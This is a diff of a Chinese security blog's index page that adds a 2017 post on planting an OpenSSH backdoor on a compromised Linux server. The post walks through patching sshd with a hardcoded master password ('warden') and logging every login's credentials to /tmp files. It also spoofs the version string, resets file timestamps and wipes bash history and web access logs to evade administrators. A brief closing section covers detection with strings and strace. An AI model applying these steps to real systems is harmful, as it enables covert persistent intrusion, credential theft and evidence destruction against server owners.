@@ -299,6 +299,225 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hello_C">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello_C技术博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html" itemprop="url">Linux渗透之OpenSSH后门</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-26T20:59:04+08:00">
+                2017-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/测试/" itemprop="url" rel="index">
+                    <span itemprop="name">测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/渗透/测试/2017/09/26/Linux渗透之OpenSSH后门.html" class="leancloud_visitors" data-flag-title="Linux渗透之OpenSSH后门">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">热度 </span>
+               
+                 <span class="leancloud-visitors-count">℃</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1,162
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  5
+                </span>
+              
+            </div>
+          
+
+          
+          
+		  
+         
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。<br>　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4</p>
+<h3 id="0x01-查看版本"><a href="#0x01-查看版本" class="headerlink" title="0x01 查看版本"></a>0x01 查看版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -V</div></pre></td></tr></table></figure>
+<p>Centos 7.0<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42766212.jpg" alt=""><br>Ubuntu 16.0.4<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/78241917.jpg" alt=""><br>有必要的话需要对原ssh配置文件进行备份，可以对后期的文件时间进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp -p /etc/ssh/ssh_config  / etc/ssh/ssh_config.bak</div><div class="line">cp -p /etc/ssh/sshd_config  / etc/ssh/sshd_config.bak</div></pre></td></tr></table></figure></p>
+<h3 id="0x02-下载SSH配置文件"><a href="#0x02-下载SSH配置文件" class="headerlink" title="0x02 下载SSH配置文件"></a>0x02 下载SSH配置文件</h3><p><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz" target="_blank" rel="external">openssh-5.9p1.tar.gz</a><br><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz" target="_blank" rel="external">openssh-5.9p1.patch.tar.gz</a><br>　　使用wget进行远程下载，如果没有安装wget，可以安装可以直接下载openssh源码，也可以使用菜刀大马等上传上去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Centos:yum -y install wget</div><div class="line">Ubuntu:apt-get install wget</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-编辑安装"><a href="#0x03-编辑安装" class="headerlink" title="0x03 编辑安装"></a>0x03 编辑安装</h3><p>Centos 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar zxvf openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.patch.tar.gz</div><div class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面</div><div class="line">patch &lt; sshbd5.9p1.diff</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/4576919.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/76087726.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/66109180.jpg" alt=""><br>可能遇到的问题patch未安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install patch</div></pre></td></tr></table></figure></p>
+<p>Ubuntu 16.0.4<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install openssh-server   #安装SSH</div><div class="line">sudo service ssh start</div><div class="line"></div><div class="line">vim /etc/ssh/sshd_config #设置root连接ssh</div><div class="line"></div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin prohibit-password</div><div class="line">StrictModes yes</div><div class="line">改成</div><div class="line">#Authentication:</div><div class="line">LoginGraceTime 120</div><div class="line">PermitRootLogin yes</div><div class="line">StrictModes yes</div><div class="line"></div><div class="line">/etc/init.d/ssh restart   #重启</div></pre></td></tr></table></figure></p>
+<p>　　编辑安装Centos 7和Ubuntu 16.0.4过程一样，就不过多介绍了。</p>
+<h3 id="0x04-修改后门密码和文件记录"><a href="#0x04-修改后门密码和文件记录" class="headerlink" title="0x04 修改后门密码和文件记录"></a>0x04 修改后门密码和文件记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim includes.h</div><div class="line">int secret_ok;</div><div class="line">FILE *f;</div><div class="line">#define ILOG &quot;/tmp/ilog&quot;  # 记录登录到本机的用户名和密码</div><div class="line">#define OLOG &quot;/tmp/olog&quot;  # 记录本机登录到远程的用户名和密码</div><div class="line">#define SECRETPW &quot;warden&quot; # 远程连接密码</div><div class="line">#endif /* INCLUDES_H */</div></pre></td></tr></table></figure>
+<p>　　可以对后门密码和记录文件进行修改，在文件前面加上.相当于是隐藏文件，也可以换个隐蔽的目录。修改之后的<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/1960037.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@localhost openssh-5.9p1# vim version.h</div><div class="line">/* $OpenBSD: version.h,v 1.62 2011/08/02 23:13:01 djm Exp $ */</div><div class="line">#define SSH_VERSION &quot;OpenSSH_5.3p1&quot;</div><div class="line">#define SSH_PORTABLE &quot;p1&quot;</div><div class="line">#define SSH_RELEASE SSH_VERSION SSH_PORTABLE</div></pre></td></tr></table></figure></p>
+<p>　　可以根据我们刚才的查看的版本信息进行修改，使其版本一致不易被管理员发现和察觉。</p>
+<h3 id="0x05-编译安装"><a href="#0x05-编译安装" class="headerlink" title="0x05 编译安装"></a>0x05 编译安装</h3><p>Centos 7<br>首先对ssh里面的几个key的权限进行修改，否则可能进行编译的时候key不能修改而报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">chmod 620 moduli</div><div class="line">chmod 600 sshd_config ssh_host_ecdsa_key ssh_host_rsa_key</div><div class="line">chmod 644 ssh_config ssh_host_ecdsa_key.pub ssh_host_rsa_key.pub</div></pre></td></tr></table></figure></p>
+<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl openssl-devel pam-devel zlib zlib-devel</div><div class="line">./configure --prefix=/usr/ --sysconfdir=/etc/ssh/ --with-pam --with-kerberos5</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">systemctl restart sshd.service</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/45803683.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42590305.jpg" alt=""></p>
+<p>Ubuntu 16.04</p>
+<p>安装环境编译运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">apt-get install -y openssl libssl-dev libpam0g-dev</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam</div><div class="line">make clean</div><div class="line">make &amp;&amp; make install</div><div class="line">/etc/init.d/ssh restart</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/58021783.jpg" alt=""><br>　　可以看到我们已经编译成功，我们的OpenSSH后门已经设置成功。使用我们的后门密码可以正常登陆，以前的密码也有记录，实验成功。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/59095904.jpg" alt=""></p>
+<h3 id="0x06-系统优化"><a href="#0x06-系统优化" class="headerlink" title="0x06 系统优化"></a>0x06 系统优化</h3><p>　　恢复新配置文件的日期跟旧文件日期一致对ssh_config和sshd_config新旧文件进行内容对比，使其配置文件一致，然后在修改文件日期。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">touch -r/etc/ssh/ssh_config.old /etc/ssh/ssh_config</div><div class="line">touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
+<p>清除操作日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">export HISTFILE=/dev/null</div><div class="line">export HISTSIZE=0</div><div class="line">cd /etc/httpd/logs/</div><div class="line">sed -i ‘/192.168.52.175/d’ access_log*</div><div class="line">echo &gt;/root/.bash_history //清空操作日志</div></pre></td></tr></table></figure></p>
+<h3 id="0x07-修复方案与应急响应"><a href="#0x07-修复方案与应急响应" class="headerlink" title="0x07 修复方案与应急响应"></a>0x07 修复方案与应急响应</h3><p>1）重装openssh软件<br>2）SSH禁止对外开放</p>
+<p>应急响应：<br>1）比对ssh的版本<br>ssh -V<br>2）查看ssh配置文件和/usr/sbin/sshd的时间<br>stat /usr/sbin/sshd<br>3）strings检查/usr/sbin/sshd，看是否有邮箱信息<br>strings可以查看二进制文件中的字符串，在应急响应中是十分有用的。有些sshd后门会通过邮件发送登录信息，通过strings /usr/sbin/sshd可以查看到邮箱信息。<br>4）通过strace监控sshd进程读写文件的操作<br>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ps axu | grep sshd | grep -v grep</div><div class="line">root 65530 0.0 0.1 48428 1260 ? Ss 13:43 0:00 /usr/sbin/sshd</div><div class="line">strace -o aa -ff -p 65530</div><div class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</div><div class="line">aa.102586:open(&quot;/tmp/ilog&quot;, O_WRONLY|O_CREAT|O_APPEND, 0666) = 4</div></pre></td></tr></table></figure></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/2017/08/03/渗透测试-01信息搜集.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -600,7 +819,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2,094
+                  2,125
                 </span>
               
 
@@ -1261,200 +1480,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/渗透/2017/05/18/一次基于Linux的渗透测试.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Hello_C">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello_C技术博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/渗透/2017/05/18/一次基于Linux的渗透测试.html" itemprop="url">一次基于Linux的渗透测试</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-18T15:52:39+08:00">
-                2017-05-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/渗透/2017/05/18/一次基于Linux的渗透测试.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="渗透/2017/05/18/一次基于Linux的渗透测试.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/渗透/2017/05/18/一次基于Linux的渗透测试.html" class="leancloud_visitors" data-flag-title="一次基于Linux的渗透测试">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">热度 </span>
-               
-                 <span class="leancloud-visitors-count">℃</span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计</span>
-                
-                <span title="字数统计">
-                  981
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  4
-                </span>
-              
-            </div>
-          
-
-          
-          
-		  
-         
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>　　最近发现了一个不错的<a href="https://www.vulnhub.com">靶场</a>，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个<a href="https://www.exploit-db.com">漏洞利用存档</a>，可以找到很多我们可以利用的学习的东西。 </p>
-<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><ul>
-<li>首先就是确定我们靶机的目标IP<br><code>nmap -sP -T5 192.168.0.1/24</code>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/渗透/2017/05/18/一次基于Linux的渗透测试.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1505,7 +1530,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">62</span>
+                <span class="site-state-item-count">63</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1516,7 +1541,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1527,7 +1552,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
